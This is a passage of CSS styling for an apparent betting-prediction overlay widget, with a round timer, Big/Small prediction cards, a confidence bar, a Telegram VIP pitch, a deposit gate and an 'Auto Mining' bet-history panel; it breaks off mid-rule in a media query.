  .status-tg-btn svg {
    flex-shrink: 0;
  }
  @keyframes livePulse {
    0%,
    100% {
      opacity: 1;
      box-shadow: 0 0 0 0 rgba(52, 211, 153, 0.5);
    }
    50% {
      opacity: 0.6;
      box-shadow: 0 0 0 4px rgba(52, 211, 153, 0);
    }
  }
  .back-btn {
    width: 32px;
    height: 32px;
    border-radius: 10px;
    flex-shrink: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    border: 1px solid var(--back-bdr);
    background: var(--back-bg);
    color: var(--back-col);
    cursor: pointer;
    padding: 0;
    font-family: var(--f);
    transition: all 0.18s;
  }
  .back-btn svg {
    width: 14px;
    height: 14px;
    stroke: currentColor;
    fill: none;
    stroke-width: 2.5;
    stroke-linecap: round;
    stroke-linejoin: round;
  }
  .back-btn:hover {
    color: var(--back-col-h);
    border-color: var(--back-bdr-h);
    background: var(--pro-lt);
  }
  .pro-top {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 10px;
  }
  .pro-gameinfo {
    flex: 1;
    min-width: 0;
    display: flex;
    flex-direction: column;
    gap: 2px;
  }
  .pro-gameinfo-row {
    display: flex;
    align-items: center;
    gap: 7px;
  }
  .pro-game-name {
    font-size: 13.5px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.25px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }
  :host(.light) .pro-game-name {
    color: #1f1f2e;
  }
  .pro-live-badge {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    background: rgba(52, 211, 153, 0.1);
    border: 1px solid rgba(52, 211, 153, 0.22);
    border-radius: 50px;
    padding: 2px 8px;
    font-size: 8px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.8px;
    color: #34d399;
    flex-shrink: 0;
    white-space: nowrap;
  }
  :host(.light) .pro-live-badge {
    background: rgba(22, 163, 74, 0.07);
    border-color: rgba(22, 163, 74, 0.2);
    color: #16a34a;
  }
  .pro-round {
    font-size: 10px;
    font-weight: 600;
    color: var(--t-dim);
    letter-spacing: 0.4px;
    font-variant-numeric: tabular-nums;
    font-family: var(--f);
  }
  :host(.light) .pro-round {
    color: #9ca3af;
  }
  .live-pip {
    width: 5px;
    height: 5px;
    border-radius: 50%;
    flex-shrink: 0;
    background: currentColor;
    animation: livePulse 2s ease-in-out infinite;
  }
  .pro-timer-wrap {
    position: relative;
    text-align: center;
    margin: 0 0 10px;
    padding: 9px 12px 11px;
    background: var(--tw-bg);
    border: 1px solid var(--tw-bdr);
    border-radius: 16px;
    overflow: hidden;
  }
  .pro-timer-wrap::after {
    content: "";
    position: absolute;
    bottom: 0;
    left: 0;
    height: 3px;
    border-radius: 0 3px 3px 0;
    width: var(--pct, 100%);
    background: linear-gradient(90deg, var(--live), #a7f3d0);
    transition:
      width 1s linear,
      background 0.6s;
  }
  .pro-timer-wrap.tw-warn::after {
    background: linear-gradient(90deg, #f59e0b, #fde68a);
  }
  .pro-timer-wrap.tw-end::after {
    background: linear-gradient(90deg, #ef4444, #fca5a5);
  }
  .pro-timer-label {
    font-size: 9px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: var(--t-dim);
    margin-bottom: 2px;
  }
  .pro-timer {
    font-size: 30px;
    font-weight: 900;
    letter-spacing: 2px;
    font-variant-numeric: tabular-nums;
    line-height: 1;
    color: var(--t-title);
    font-family: var(--f);
    transition: color 0.4s;
  }
  .pro-timer.t-warn {
    color: #f59e0b;
  }
  .pro-timer.t-end {
    color: #ef4444;
    animation: timerShake 0.45s var(--ease) infinite;
  }
  @keyframes timerShake {
    0%,
    100% {
      transform: scale(1);
    }
    50% {
      transform: scale(1.07);
    }
  }
  .pro-card {
    background: var(--pc-bg);
    border: 1px solid var(--pc-bdr);
    border-radius: 16px;
    padding: 20px 14px 16px;
    box-shadow: var(--pc-shad);
    min-height: 138px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    overflow: hidden;
    transition:
      border-color 0.5s,
      box-shadow 0.5s;
  }
  .pro-card::before {
    content: "";
    position: absolute;
    inset: 0;
    background: linear-gradient(
      105deg,
      transparent 35%,
      rgba(139, 92, 246, 0.05) 50%,
      transparent 65%
    );
    opacity: 0;
    transition: opacity 0.3s;
  }
  .pro-card.shimmer::before {
    opacity: 1;
    animation: sweep 1.7s ease-in-out infinite;
  }
  @keyframes sweep {
    0% {
      transform: translateX(-100%);
    }
    100% {
      transform: translateX(100%);
    }
  }
  .pro-card.c-big {
    border-color: rgba(254, 170, 87, 0.24);
    box-shadow:
      0 10px 36px rgba(254, 170, 87, 0.12),
      0 0 0 1px rgba(254, 170, 87, 0.1);
  }
  .pro-card.c-small {
    border-color: rgba(110, 168, 244, 0.24);
    box-shadow:
      0 10px 36px rgba(110, 168, 244, 0.12),
      0 0 0 1px rgba(110, 168, 244, 0.1);
  }
  :host(.light) .pro-card.c-big {
    border-color: rgba(254, 170, 87, 0.3);
    box-shadow:
      0 6px 24px rgba(254, 170, 87, 0.15),
      0 0 0 1px rgba(254, 170, 87, 0.12);
  }
  :host(.light) .pro-card.c-small {
    border-color: rgba(110, 168, 244, 0.3);
    box-shadow:
      0 6px 24px rgba(110, 168, 244, 0.15),
      0 0 0 1px rgba(110, 168, 244, 0.12);
  }
  .pro-scanning {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 14px;
    min-height: 100px;
    width: 100%;
  }
  .scan-rings {
    position: relative;
    width: 52px;
    height: 52px;
  }
  .scan-ring-o {
    position: absolute;
    inset: 0;
    border-radius: 50%;
    border: 2px solid transparent;
    border-top-color: var(--pro);
    animation: spin 1.3s linear infinite;
  }
  .scan-ring-i {
    position: absolute;
    inset: 11px;
    border-radius: 50%;
    border: 2px solid transparent;
    border-top-color: var(--pro-txt);
    opacity: 0.5;
    animation: spin 0.75s linear infinite reverse;
  }
  @keyframes spin {
    to {
      transform: rotate(360deg);
    }
  }
  .scan-label {
    font-size: 11px;
    font-weight: 600;
    color: var(--t-body);
    letter-spacing: 0.2px;
    font-family: var(--f);
    display: flex;
    align-items: center;
    gap: 3px;
  }
  .s-dot {
    width: 3px;
    height: 3px;
    border-radius: 50%;
    background: currentColor;
    opacity: 0.3;
    animation: blink 1.2s ease-in-out infinite;
  }
  .s-dot:nth-child(2) {
    animation-delay: 0.2s;
  }
  .s-dot:nth-child(3) {
    animation-delay: 0.4s;
  }
  @keyframes blink {
    0%,
    80%,
    100% {
      opacity: 0.2;
    }
    40% {
      opacity: 0.9;
    }
  }
  .pro-prediction {
    width: 100%;
    text-align: center;
    animation: reveal 0.45s cubic-bezier(0.2, 0.8, 0.2, 1);
  }
  @keyframes reveal {
    from {
      opacity: 0;
      transform: scale(0.84);
      filter: blur(6px);
    }
    to {
      opacity: 1;
      transform: scale(1);
      filter: blur(0);
    }
  }
  .streak-badge {
    display: none;
    align-items: center;
    justify-content: center;
    gap: 4px;
    padding: 3px 10px;
    border-radius: 50px;
    margin: 0 auto 10px;
    background: var(--pro-lt);
    color: var(--pro-txt);
    border: 1px solid rgba(139, 92, 246, 0.2);
    font-size: 9px;
    font-weight: 800;
    letter-spacing: 0.3px;
    text-transform: uppercase;
    width: fit-content;
  }
  :host(.light) .streak-badge {
    background: rgba(224, 60, 60, 0.07);
    color: #b91c1c;
    border-color: rgba(224, 60, 60, 0.16);
  }
  .pred-hero {
    position: relative;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 12px;
    height: 68px;
  }
  .pred-glow {
    position: absolute;
    width: 82px;
    height: 82px;
    border-radius: 50%;
    filter: blur(24px);
    opacity: 0;
    transition:
      opacity 0.5s,
      background 0.5s;
    pointer-events: none;
  }
  .pred-glow.big {
    background: var(--big);
    opacity: 0.22;
  }
  .pred-glow.small {
    background: var(--small);
    opacity: 0.22;
  }
  :host(.light) .pred-glow.big {
    opacity: 0.16;
  }
  :host(.light) .pred-glow.small {
    opacity: 0.16;
  }
  .pred-ball {
    width: 60px;
    height: 60px;
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;
    filter: drop-shadow(0 6px 14px rgba(0, 0, 0, 0.25));
    position: relative;
    z-index: 1;
    animation: float 3s ease-in-out infinite;
  }
  @keyframes float {
    0%,
    100% {
      transform: translateY(0);
    }
    50% {
      transform: translateY(-4px);
    }
  }
  .pred-tags {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    margin-bottom: 12px;
  }
  .pred-size {
    padding: 7px 26px;
    border-radius: 50px;
    font-size: 15px;
    font-weight: 900;
    color: #fff;
    letter-spacing: -0.1px;
    position: relative;
    overflow: hidden;
    transition: all 0.35s;
  }
  .pred-size::after {
    content: "";
    position: absolute;
    top: -60%;
    left: -40%;
    width: 180%;
    height: 160%;
    background: linear-gradient(
      135deg,
      rgba(255, 255, 255, 0.18),
      transparent 55%
    );
    pointer-events: none;
  }
  .pred-size.big {
    background: linear-gradient(135deg, #feaa57, #f97316);
    box-shadow: 0 4px 18px rgba(254, 170, 87, 0.45);
  }
  .pred-size.small {
    background: linear-gradient(135deg, #6ea8f4, #3b82f6);
    box-shadow: 0 4px 18px rgba(110, 168, 244, 0.45);
  }
  .pred-color {
    padding: 5px 14px;
    border-radius: 50px;
    font-size: 10px;
    font-weight: 800;
    color: #fff;
    letter-spacing: 0.4px;
    text-transform: uppercase;
  }
  .pred-color.red {
    background: linear-gradient(135deg, #fb5b5b, #dc2626);
  }
  .pred-color.green {
    background: linear-gradient(135deg, #18b660, #16a34a);
  }
  .pred-color.violet {
    background: linear-gradient(135deg, #c86eff, #9333ea);
  }
  .pred-conf {
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .conf-track {
    flex: 1;
    height: 5px;
    background: var(--strip);
    border-radius: 3px;
    overflow: hidden;
  }
  .conf-fill {
    height: 100%;
    border-radius: 3px;
    background: linear-gradient(90deg, var(--big), #fb5b5b);
    transition: width 0.7s var(--ease);
    width: 0;
    position: relative;
  }
  .conf-fill.small {
    background: linear-gradient(90deg, var(--small), #6ea8f4);
  }
  .conf-fill::after {
    content: "";
    position: absolute;
    right: -1px;
    top: -2px;
    bottom: -2px;
    width: 7px;
    background: inherit;
    border-radius: 50%;
    filter: blur(3px);
    opacity: 0.65;
  }
  .conf-pct {
    font-size: 12px;
    font-weight: 900;
    color: var(--t-title);
    font-variant-numeric: tabular-nums;
    min-width: 35px;
    text-align: right;
  }
  :host(.light) .conf-pct {
    color: #1f1f2e;
  }
  .pred-history {
    display: none;
    align-items: center;
    justify-content: center;
    gap: 4px;
    margin-top: 10px;
    padding-top: 10px;
    border-top: 1px solid var(--strip);
  }
  .hist-label {
    font-size: 9px;
    font-weight: 700;
    color: var(--t-dim);
    letter-spacing: 0.2px;
    margin-right: 2px;
  }
  .hist-dot {
    width: 10px;
    height: 10px;
    border-radius: 50%;
    flex-shrink: 0;
    transition: transform 0.2s;
    cursor: default;
  }
  .hist-dot.big {
    background: var(--big);
    box-shadow: 0 0 5px rgba(254, 170, 87, 0.4);
  }
  .hist-dot.small {
    background: var(--small);
    box-shadow: 0 0 5px rgba(110, 168, 244, 0.4);
  }
  .hist-dot:hover {
    transform: scale(1.4);
  }
  .vip-header {
    display: flex;
    align-items: center;
    gap: 9px;
    margin-bottom: 12px;
  }
  .vip-header-label {
    flex: 1;
    font-size: 13.5px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.2px;
  }
  .vip-invite-pill {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    background: var(--vip-lt);
    border: 1px solid var(--vip-bdr-h);
    border-radius: 50px;
    padding: 2px 8px;
    font-size: 8px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.8px;
    color: var(--vip);
    white-space: nowrap;
  }
  .vip-hero-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 18px;
    padding: 22px 16px 20px;
    text-align: center;
    margin-bottom: 10px;
    position: relative;
    overflow: hidden;
  }
  .vip-hero-card::before {
    content: "";
    position: absolute;
    top: -50px;
    left: 50%;
    transform: translateX(-50%);
    width: 140px;
    height: 140px;
    background: radial-gradient(
      circle,
      rgba(42, 171, 238, 0.13) 0%,
      transparent 70%
    );
    pointer-events: none;
  }
  .vip-tg-ring {
    width: 60px;
    height: 60px;
    border-radius: 50%;
    background: linear-gradient(135deg, #2aabee, #229ed9);
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 13px;
    box-shadow:
      0 0 0 8px rgba(42, 171, 238, 0.1),
      0 0 0 16px rgba(42, 171, 238, 0.05),
      0 6px 24px rgba(42, 171, 238, 0.38);
    animation: tgPulse 2.8s ease-in-out infinite;
  }
  @keyframes tgPulse {
    0%,
    100% {
      box-shadow:
        0 0 0 8px rgba(42, 171, 238, 0.1),
        0 0 0 16px rgba(42, 171, 238, 0.05),
        0 6px 24px rgba(42, 171, 238, 0.38);
    }
    50% {
      box-shadow:
        0 0 0 11px rgba(42, 171, 238, 0.14),
        0 0 0 20px rgba(42, 171, 238, 0.06),
        0 8px 30px rgba(42, 171, 238, 0.44);
    }
  }
  .vip-title {
    font-size: 17px;
    font-weight: 900;
    color: var(--gate-title);
    margin: 0 0 7px;
    letter-spacing: -0.5px;
    font-family: var(--f);
    line-height: 1.2;
  }
  .vip-pitch {
    font-size: 11.5px;
    line-height: 1.6;
    color: var(--t-body);
    margin: 0;
    font-family: var(--f);
  }
  .vip-stats {
    display: grid;
    grid-template-columns: 1fr 1fr 1fr;
    margin: 0 0 10px;
    text-align: center;
    background: var(--stat-bg);
    border-radius: 14px;
    border: 1px solid var(--stat-bdr);
    padding: 10px 0;
  }
  .vip-stat {
    display: flex;
    flex-direction: column;
    gap: 1px;
  }
  .vip-stat + .vip-stat {
    border-left: 1px solid var(--stat-bdr);
  }
  .stat-val {
    font-size: 17px;
    font-weight: 900;
    color: var(--gate-title);
    letter-spacing: -0.5px;
    font-family: var(--f);
  }
  .stat-lbl {
    font-size: 9px;
    font-weight: 700;
    color: var(--t-dim);
    text-transform: uppercase;
    letter-spacing: 0.7px;
  }
  .vip-cta {
    width: 100%;
    padding: 12px 16px;
    border-radius: 13px;
    border: none;
    background: linear-gradient(135deg, #2aabee, #1a90cc);
    color: #fff;
    font-size: 13.5px;
    font-weight: 800;
    letter-spacing: 0.02px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 7px;
    font-family: var(--f);
    box-shadow:
      0 5px 20px rgba(42, 171, 238, 0.38),
      0 0 0 1px rgba(42, 171, 238, 0.2);
    transition: all 0.2s var(--ease);
    position: relative;
    overflow: hidden;
  }
  .vip-cta::after {
    content: "";
    position: absolute;
    inset: 0;
    background: linear-gradient(
      135deg,
      rgba(255, 255, 255, 0.15),
      transparent 55%
    );
    pointer-events: none;
  }
  .vip-cta:hover {
    box-shadow:
      0 8px 28px rgba(42, 171, 238, 0.52),
      0 0 0 1px rgba(42, 171, 238, 0.3);
    transform: translateY(-2px);
  }
  .vip-cta:active {
    transform: scale(0.97);
    transition-duration: 0.08s;
  }
  .vip-arrow {
    flex-shrink: 0;
    transition: transform 0.2s var(--ease);
  }
  .vip-cta:hover .vip-arrow {
    transform: translateX(3px);
  }
  .vip-note {
    text-align: center;
    font-size: 9.5px;
    color: var(--t-dim);
    margin: 8px 0 0;
    font-family: var(--f);
    font-weight: 500;
    letter-spacing: 0.1px;
  }
  .gate-view {
    display: none;
    padding: 22px 16px 24px;
    text-align: center;
    animation: fadeUp 0.25s var(--ease);
  }
  .gate-icon {
    width: 46px;
    height: 46px;
    margin: 0 auto 12px;
    background: var(--pro-lt);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    color: var(--pro);
    box-shadow: 0 0 0 6px var(--pro-glow);
  }
  .gate-title {
    font-size: 16px;
    font-weight: 900;
    color: var(--gate-title);
    margin: 0 0 6px;
    letter-spacing: -0.4px;
    font-family: var(--f);
  }
  .gate-bal-wrap {
    margin-bottom: 10px;
  }
  .gate-balance {
    display: inline-flex;
    align-items: center;
    background: var(--gate-bal-bg);
    padding: 5px 14px;
    border-radius: 50px;
    font-size: 13px;
    font-weight: 800;
    color: var(--gate-bal-col);
    border: 1px solid var(--gate-bal-bdr);
    font-family: var(--f);
  }
  .gate-desc {
    font-size: 11px;
    line-height: 1.55;
    color: var(--t-body);
    margin: 0 0 16px;
    font-family: var(--f);
  }
  .gate-actions {
    display: flex;
    flex-direction: column;
    gap: 7px;
  }
  .gate-btn {
    padding: 11px 14px;
    border-radius: 12px;
    border: none;
    font-size: 13px;
    font-weight: 700;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: var(--f);
    transition: all 0.2s var(--ease);
    position: relative;
    overflow: hidden;
  }
  .gate-btn:active {
    transform: scale(0.97);
  }
  .gate-btn::after {
    content: "";
    position: absolute;
    inset: 0;
    background: linear-gradient(
      135deg,
      rgba(255, 255, 255, 0.12),
      transparent 55%
    );
    pointer-events: none;
  }
  .btn-deposit {
    background: linear-gradient(135deg, #22c55e, #16a34a);
    color: #fff;
    box-shadow: 0 4px 16px rgba(34, 197, 94, 0.32);
  }
  .btn-deposit:hover {
    box-shadow: 0 6px 22px rgba(34, 197, 94, 0.44);
    transform: translateY(-1px);
  }
  .btn-telegram {
    background: var(--card-bg);
    color: var(--t-body);
    border: 1px solid var(--card-bdr);
    font-weight: 600;
    font-size: 12px;
  }
  .btn-telegram:hover {
    color: var(--t-title);
    border-color: var(--pro-bdr-h);
  }
  .pro-prediction .pred-hero,
  .pro-prediction .pred-color {
    display: none;
  }
  .pro-prediction.vip-mode .pred-hero {
    display: flex;
  }
  .pro-prediction.vip-mode .pred-color {
    display: inline-block;
  }
  .mine-header {
    display: flex;
    align-items: center;
    gap: 9px;
    margin-bottom: 12px;
  }
  .mine-header-label {
    flex: 1;
    font-size: 13.5px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.2px;
  }
  .mine-energy-pill {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    background: var(--mine-lt);
    border: 1px solid var(--mine-bdr-h);
    border-radius: 50px;
    padding: 2.5px 9px 2.5px 7px;
    font-size: 9px;
    font-weight: 700;
    letter-spacing: 0.5px;
    color: var(--mine);
    white-space: nowrap;
    animation: energyPulse 2.5s ease-in-out infinite;
  }
  :host(.light) .mine-energy-pill {
    color: var(--mine-txt);
  }
  @keyframes energyPulse {
    0%,
    100% {
      box-shadow: 0 0 0 0 transparent;
    }
    50% {
      box-shadow: 0 0 0 4px var(--mine-glow);
    }
  }
  .energy-svg {
    width: 11px;
    height: 11px;
    fill: currentColor;
  } /* ── Auto Mining ── */
  .view-mining {
    position: relative;
  }
  .view-mining.active {
    animation: vipFadeIn 0.16s cubic-bezier(0.16, 1, 0.3, 1) both;
  }
  .mine-shell {
    display: flex;
    flex-direction: column;
  }
  .mine-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 14px;
    overflow: hidden;
    position: relative;
  }
  .mine-card::before {
    content: "";
    position: absolute;
    top: -1px;
    left: 14px;
    right: 14px;
    height: 1px;
    background: linear-gradient(
      90deg,
      transparent,
      color-mix(in srgb, var(--mine) 32%, transparent),
      transparent
    );
    pointer-events: none;
  }
  .mine-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 8px;
    padding: 9px 13px;
    min-height: 36px;
    border-bottom: 1px solid var(--strip);
  }
  .mine-lbl {
    font-size: 11.5px;
    font-weight: 600;
    color: var(--t-body);
    letter-spacing: -0.05px;
    display: inline-flex;
    align-items: center;
    gap: 6px;
    flex-shrink: 0;
  }
  .mine-lbl-icon {
    width: 14px;
    height: 14px;
    flex-shrink: 0;
    opacity: 0.6;
  }
  .mine-val {
    font-size: 13px;
    font-weight: 800;
    color: var(--mine);
    font-family: var(--f);
    font-variant-numeric: tabular-nums;
    letter-spacing: -0.2px;
  }
  .mine-input-wrap {
    display: flex;
    align-items: center;
    gap: 3px;
    background: var(--back-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 8px;
    padding: 4px 8px;
    transition:
      border-color 0.15s,
      box-shadow 0.15s;
  }
  .mine-input-wrap:focus-within {
    border-color: var(--mine-bdr-h);
    box-shadow: 0 0 0 3px var(--mine-glow);
  }
  .mine-symbol {
    font-size: 10px;
    font-weight: 600;
    color: var(--t-dim);
  }
  .mine-input {
    width: 68px;
    background: transparent;
    border: none;
    outline: none;
    padding: 0;
    font-size: 12px;
    font-weight: 700;
    color: var(--t-title);
    font-family: var(--f);
    text-align: right;
    -webkit-appearance: none;
    appearance: none;
    font-variant-numeric: tabular-nums;
  }
  .mine-input::-webkit-inner-spin-button,
  .mine-input::-webkit-outer-spin-button {
    -webkit-appearance: none;
    margin: 0;
  }
  .mine-terminal-section {
    padding: 9px 11px;
    border-bottom: 1px solid var(--strip);
  }
  .mining-terminal {
    background: var(--back-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 9px;
    padding: 8px 10px;
    height: 72px;
    overflow-y: auto;
    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
    font-size: 9px;
    color: var(--t-dim);
    display: flex;
    flex-direction: column;
    gap: 2px;
    scrollbar-width: none;
    scroll-behavior: smooth;
  }
  .mining-terminal::-webkit-scrollbar {
    display: none;
  }
  .mining-terminal .console-line.win {
    color: var(--mine);
  }
  .mining-terminal .console-line.loss {
    color: var(--pro);
  }
  .mining-terminal .console-line.wait {
    color: var(--t-dim);
  }
  .mining-terminal .console-line.active {
    color: var(--mine);
    font-weight: 600;
  }
  .mine-card-foot {
    padding: 10px 13px 11px;
  }
  .mine-cta {
    width: 100%;
    padding: 11px;
    border-radius: 11px;
    border: none;
    background: var(--mine);
    color: #fff;
    font-size: 12.5px;
    font-weight: 700;
    letter-spacing: -0.1px;
    cursor: pointer;
    font-family: var(--f);
    box-shadow: 0 2px 12px color-mix(in srgb, var(--mine) 30%, transparent);
    transition:
      transform 0.15s cubic-bezier(0.16, 1, 0.3, 1),
      box-shadow 0.15s cubic-bezier(0.16, 1, 0.3, 1),
      background 0.15s;
    position: relative;
    overflow: hidden;
  }
  .mine-cta::after {
    content: "";
    position: absolute;
    inset: 0;
    background: linear-gradient(
      135deg,
      rgba(255, 255, 255, 0.1),
      transparent 52%
    );
    pointer-events: none;
  }
  .mine-cta:hover {
    box-shadow: 0 4px 16px color-mix(in srgb, var(--mine) 40%, transparent);
  }
  .mine-cta:active {
    transform: scale(0.98);
    transition-duration: 0.06s;
  }
  .mine-cta.active {
    background: var(--pro);
    box-shadow: 0 2px 12px color-mix(in srgb, var(--pro) 30%, transparent);
  }
  .mine-cta.active:hover {
    box-shadow: 0 4px 16px color-mix(in srgb, var(--pro) 40%, transparent);
  }
  .mine-note {
    text-align: center;
    font-size: 9.5px;
    color: var(--t-dim);
    margin: 7px 0 0;
    font-weight: 500;
    letter-spacing: 0.02px;
  }
  .mine-hist-btn {
    width: 32px;
    height: 32px;
    border-radius: 10px;
    flex-shrink: 0;
    margin-left: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    border: 1px solid var(--mine-bdr-h);
    background: var(--mine-lt);
    color: var(--mine);
    cursor: pointer;
    padding: 0;
    transition:
      background 0.15s,
      color 0.15s,
      border-color 0.15s,
      transform 0.15s;
  }
  .mine-hist-btn svg {
    width: 14px;
    height: 14px;
  }
  .mine-hist-btn:hover {
    background: var(--mine);
    color: #fff;
  }
  .mine-hist-btn:active {
    transform: scale(0.97);
    transition-duration: 0.06s;
  }
  .mining-energy-modal {
    position: absolute;
    inset: 0;
    z-index: 100;
    background: rgba(10, 8, 28, 0.88);
    backdrop-filter: blur(12px);
    -webkit-backdrop-filter: blur(12px);
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 16px;
    padding: 20px;
    box-sizing: border-box;
    animation: modalPop 0.2s cubic-bezier(0.16, 1, 0.3, 1) forwards;
  }
  @keyframes modalPop {
    0% {
      opacity: 0;
      transform: scale(0.97);
    }
    100% {
      opacity: 1;
      transform: scale(1);
    }
  }
  .energy-modal-close {
    position: absolute;
    top: 10px;
    right: 10px;
    width: 28px;
    height: 28px;
    border-radius: 50%;
    background: var(--back-bg);
    border: 1px solid var(--card-bdr);
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: background 0.15s;
    padding: 0;
  }
  .energy-modal-close svg {
    width: 14px;
    height: 14px;
    color: var(--t-dim);
  }
  .energy-modal-close:hover {
    background: var(--strip);
  }
  .energy-modal-content {
    text-align: center;
    max-width: 220px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 8px;
  }
  .energy-modal-icon {
    width: 50px;
    height: 50px;
    border-radius: 14px;
    background: var(--pro-lt);
    border: 1px solid var(--pro-bdr-h);
    display: flex;
    align-items: center;
    justify-content: center;
    color: var(--pro);
  }
  .energy-modal-icon svg {
    width: 28px;
    height: 28px;
  }
  .energy-modal-title {
    font-size: 14px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.2px;
  }
  .energy-modal-desc {
    font-size: 10.5px;
    font-weight: 500;
    color: var(--t-body);
    line-height: 1.5;
  }
  .energy-modal-actions {
    display: flex;
    flex-direction: column;
    gap: 7px;
    width: 100%;
    margin-top: 6px;
  }
  .energy-btn-primary {
    width: 100%;
    padding: 11px;
    border-radius: 11px;
    font-size: 12.5px;
    font-weight: 700;
    cursor: pointer;
    font-family: var(--f);
    border: none;
    background: var(--mine);
    color: #fff;
    box-shadow: 0 2px 12px color-mix(in srgb, var(--mine) 28%, transparent);
    transition:
      transform 0.15s,
      box-shadow 0.15s;
  }
  .energy-btn-primary:hover {
    box-shadow: 0 4px 16px color-mix(in srgb, var(--mine) 38%, transparent);
  }
  .energy-btn-primary:active {
    transform: scale(0.98);
  }
  .energy-btn-secondary {
    width: 100%;
    padding: 10px;
    border-radius: 11px;
    font-size: 11.5px;
    font-weight: 600;
    cursor: pointer;
    font-family: var(--f);
    background: transparent;
    color: var(--t-body);
    border: 1px solid var(--card-bdr);
    transition:
      border-color 0.15s,
      transform 0.15s;
  }
  .energy-btn-secondary:hover {
    border-color: var(--pro-bdr-h);
    color: var(--t-title);
  }
  .energy-btn-secondary:active {
    transform: scale(0.98);
  }
  :host(.light) .mining-energy-modal {
    background: rgba(255, 255, 255, 0.94);
  }
  .console-line {
    line-height: 1.4;
    animation: consoleFade 0.2s cubic-bezier(0.16, 1, 0.3, 1) both;
    letter-spacing: 0.1px;
  }
  @keyframes consoleFade {
    from {
      opacity: 0;
      transform: translateY(3px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }
  .mining-history-modal {
    position: absolute;
    inset: 0;
    z-index: 100;
    background: rgba(10, 8, 28, 0.88);
    backdrop-filter: blur(12px);
    -webkit-backdrop-filter: blur(12px);
    display: flex;
    flex-direction: column;
    border-radius: 16px;
    padding: 12px;
    box-sizing: border-box;
    animation: modalPop 0.2s cubic-bezier(0.16, 1, 0.3, 1) forwards;
  }
  .history-modal-content {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 7px;
    overflow: hidden;
    padding-top: 18px;
  }
  .history-modal-title {
    font-size: 13px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.15px;
    text-align: center;
  }
  .history-list {
    flex: 1;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
    gap: 3px;
    scrollbar-width: none;
    padding: 2px 0;
  }
  .history-list::-webkit-scrollbar {
    display: none;
  }
  .history-list:empty::after {
    content: "No mining history yet.";
    display: block;
    text-align: center;
    font-size: 10px;
    color: var(--t-dim);
    padding: 28px 0;
  }
  .hist-entry {
    display: flex;
    align-items: center;
    gap: 7px;
    padding: 7px 9px;
    border-radius: 8px;
    background: var(--back-bg);
    border: 1px solid var(--card-bdr);
    font-size: 9.5px;
    animation: consoleFade 0.18s ease both;
  }
  .hist-entry .hist-side {
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.3px;
    font-size: 8.5px;
    min-width: 28px;
  }
  .hist-entry .hist-side.BigSmall_Big {
    color: var(--big);
  }
  .hist-entry .hist-side.BigSmall_Small {
    color: var(--small);
  }
  .hist-entry .hist-amt {
    flex: 1;
    color: var(--t-body);
    font-variant-numeric: tabular-nums;
  }
  .hist-entry .hist-net {
    font-weight: 800;
    font-variant-numeric: tabular-nums;
    min-width: 48px;
    text-align: right;
  }
  .hist-entry .hist-net.win {
    color: var(--mine);
  }
  .hist-entry .hist-net.loss {
    color: var(--pro);
  }
  .hist-entry .hist-time {
    font-size: 8px;
    color: var(--t-dim);
    min-width: 44px;
    text-align: right;
  }
  .history-clear-btn {
    width: 100%;
    padding: 9px;
    border-radius: 9px;
    border: 1px solid var(--card-bdr);
    background: transparent;
    color: var(--t-dim);
    font-size: 10px;
    font-weight: 600;
    cursor: pointer;
    font-family: var(--f);
    transition:
      border-color 0.15s,
      color 0.15s,
      transform 0.15s;
    flex-shrink: 0;
  }
  .history-clear-btn:hover {
    border-color: var(--pro-bdr-h);
    color: var(--pro);
  }
  .history-clear-btn:active {
    transform: scale(0.98);
  }
  :host(.light) .mining-history-modal {
    background: rgba(255, 255, 255, 0.94);
  }
  @media (min-width: 768px) {
    .panel {
      width: min(90vw, 310px);
    }
    .menu-home-opt {
      padding: 12px 13px;
    }
    .menu-home-name {
      font-size: 13.5px;
    }
  }
  @media (max-width: 320px) {
    .panel {
      width: 94vw;
    }
    .pro-timer {
      font-size: 24px;
    }
    .pred-ball {
      width: 48px;
      height: 48px;
    }
    .pred-size {
      padding: 6px 18px;
      font-size: 13px;
    }
    .pro-card {
      padding: 14px 10px;
      min-height: 112px;
    }
    .pred-hero {
      height: 56px;
    }
    .mine-input {
      width: 55px;
      font-size: 11px;
    }
    .mine-cta {
      padding: 10px;
      font-size: 12px;
    }
    .mining-terminal {
